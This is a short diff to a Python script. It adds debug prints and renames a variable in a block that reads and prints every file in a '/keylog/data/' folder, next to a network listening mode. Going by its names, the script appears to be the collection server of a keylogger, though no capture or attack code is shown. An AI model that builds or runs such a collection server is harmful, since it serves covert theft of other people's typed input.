@@ -84,14 +84,16 @@ if __name__ == '__main__':
     if argument.readfile:
         path = '/keylog/data/'
         fics = glob.glob(os.path.join(path, '*'))
+        print(fics)
         #client_address = server_socket.getpeername()
         #ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
-        for fic in fics :
+        for fic in fics:
+            print(fic)
             with open(fic, "r") as f:
-                file = f.read()
-                print(file)
+                d = f.read()
+                print(d)
     else :
-        
+
         if argument.listen:
 
             port = argument.listen
